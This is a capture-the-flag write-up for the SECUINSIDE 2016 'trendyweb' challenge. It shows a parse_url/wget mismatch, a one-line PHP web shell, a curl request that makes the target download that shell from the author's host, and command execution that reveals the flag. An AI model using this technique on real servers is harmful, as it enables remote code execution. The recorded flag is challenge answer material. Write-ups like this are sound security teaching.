# SECUINSIDE 2016: trendyweb

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| SECUINSIDE | trendyweb | Web | ~~100~~ 0* |

\**Points were not rewarded due to time.*

### Description
> Trendy~! Web~
> The flag reader is on /.
>
> http://chal.cykor.kr:8082
> http://52.78.11.234:8082
>
> p.s.
> If the download doesn't work, try this:
> https://gist.github.com/Jinmo/e49dfef9b7325acb12566de3a7f88859
>
> and it requires data/ folder
> [index.php](index.php)

## Write-up
Upon inspecting [index.php](index.php) we clearly see there's some serialization
going on, but which peeked our initial interest. But when looking little further
we can see that the `download_image` function provides us with all we need:

```php
function download_image($url) {
  $url = parse_url($origUrl=$url);
  if(isset($url['scheme']) && $url['scheme'] == 'http')
    if($url['path'] == '/avatar.png') {
      system('/usr/bin/wget '.escapeshellarg($origUrl));
    }
}
```

Upon loading the page, at some point we see this function is called if
`POST['image']` is set:

```php
if(isset($_POST['image'])) download_image($_POST['image']);
```

So what does `download_image` actually do? As we can see it expects a URL, which
it then checks to be valid or not, by checking the `scheme` and `path` as
returned by php's `parse_url`. So let's see how 
[parse_url](http://php.net/manual/en/function.parse-url.php) actually works:

> ### Return Values
>
> On seriously malformed URLs, parse_url() may return FALSE.
>
> If the component parameter is omitted, an associative array is returned. At least one element will be present within the array. Potential keys within this array are:
>
>     scheme - e.g. http
>     host
>     port
>     user
>     pass
>     path
>     query - after the question mark ?
>     fragment - after the hashmark #
>
> If the component parameter is specified, parse_url() returns a string (or an integer, in the case of PHP_URL_PORT) instead of an array. If the requested component doesn't exist within the given URL, NULL will be returned.

This learns us that the querystring after `?` is not actually considered as a
part of the path. Which is logical, but conflicts in this case with wget's
behaviour. What happens is that wget **will** actually take the querystring into
account when saving the file, allowing us to exploit this function. First we
craft our malicious `avatar.png`:

```bash
$ echo "<?php system($_GET['cmd']); ?>" > avatar.png
```

Then we start a HTTP server (using `python3.5 -m http.server 8080` in our case), 
and verify it works as expected.

```bash
$ wget -q 127.0.0.1:8080/avatar.png?.php
$ ls avatar*
avatar.png  avatar.png?.php
```

Sweet, so let's get our malicious avatar onto the server, by making a POST request 
with the crafted url:

```bash
$ curl --data "image=http://smoke.leet.everyday/avatar.png?.php" http://chal.cykor.kr:8082

<img src="/data/5f390149ab1a4a8ed665/avatar.png" width=80 height=80 />
```

Our server logs verify the file has been requested by the target:
```bash
52.78.65.150 - - [10/Jul/2016 07:31:46] "GET /avatar.png?.php HTTP/1.1" 200 -
```

Sweet. Now let's see: (notice we URLencode the first `?` to `%3f`, to avoid it being
 interpreted as a premature start of the querystring, as well as the passed command):

```bash
$ curl http://chal.cykor.kr:8082/data/5f390149ab1a4a8ed665/avatar.png%3f.php?cmd=ls%20/
bin
boot
dev
etc
flag_is_heeeeeeeereeeeeee
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ curl "http://chal.cykor.kr:8082/data/5f390149ab1a4a8ed665/avatar.png%3f.php?cmd=cat%20/flag_is_heeeeeeeereeeeeee"
$
```

Nothing...? This had us wondering for a while, let's figure out what
`flag_is_heeeeeeeereeeeeee` actually is then...

```bash
$ curl "http://chal.cykor.kr:8082/data/5f390149ab1a4a8ed665/avatar.png%3f.php?cmd=ls%20-l%20/flag_is_heeeeeeeereeeeeee"
---x--x---. 1 root www-data 6172 Jul  9 08:26 /flag_is_heeeeeeeereeeeeee
```
### Solution
Ah, executable then, so let's run it, to finally get our flag:
```bash
curl "http://chal.cykor.kr:8082/data/5f390149ab1a4a8ed665/avatar.png%3f.php?cmd=/flag_is_heeeeeeeereeeeeee"
1-day is not trendy enough
```

### Looking back
Tadaa, the flag was `1-day is not trendy enough`. Now it would have been nice if
we were able around to start playing this CTF a little earlier on (logistics
fail on our side...), so we could have actually submitted the flag while the game
was still running. Maybe a prettier solution (and one that would have payed off if
poking around after getting a shell) than using curl here, would have been to 
write a small python script that would provide with an actual interactive shell
to play around with, by urlencoding our commands and crafting the querystring
automagically.

Ah well, funny little challenge and worth a writeup anyway.
